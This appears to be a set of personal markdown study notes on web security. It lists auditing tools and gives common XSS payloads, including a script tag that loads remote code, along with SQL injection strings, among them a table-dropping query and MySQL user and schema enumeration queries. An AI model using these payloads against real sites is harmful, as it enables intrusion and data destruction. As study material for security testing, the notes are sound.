# Notes About Web Security
## Useful Auditing Tools:
`burpsuite` to capture and modify packets (purchase pro version if you like auto scannning :p)

`nmap ncat` to scan and test ports

`whois` and `theharvester` to collect OSINT data

`python` to create scripts

`sqlmap` to detect and exploit SQL Injection

and of course `F12(Developer tools)` in Browser(very useful!)
### #don't be a script kiddy!!


## Common Vulnerbilities

### XSS(Cross Site Scripting)
#### Description
Injects malicious code to a web page
#### Attacking Vectors
##### Basic
`<script src = www.example.com/xss.js></script>`
 
 or
 
 `<script>alert(1)</script>`
##### Advanced Vector
`<a id=x tabindex=1 onactivate=alert(1)></a>`

`<body onafterprint=alert(1)>`

`<a id=x tabindex=1 onbeforeactivate=alert(1)></a>`

`<audio src/onerror=alert(1)>`

`<body onpageshow=alert(1)>`

`<body onresize=alert(1)`

and more on [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
### SQL Injection
#### Description
Inject SQL syntax to a vulnerble server
#### Attacking Vectors
##### Comment the rest of the query
`DROP TABLE1; --`

or

`DROP TABLE1; #`
##### Login bypass
use `'` and `--` to close brackets and comment the queries
##### Common Vectors(MySQL for example)
`SELECT @@version`

`SELECT user();`

`SELECT user FROM mysql.user;`

`SELECT distinct(db) FROM mysql.db `

`SELECT schema_name FROM information_schema.schemata; (for MySQL >= v5.0)`

`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`

`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`

`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’`
### CSRF (Cross-Site-Request-Forgery)


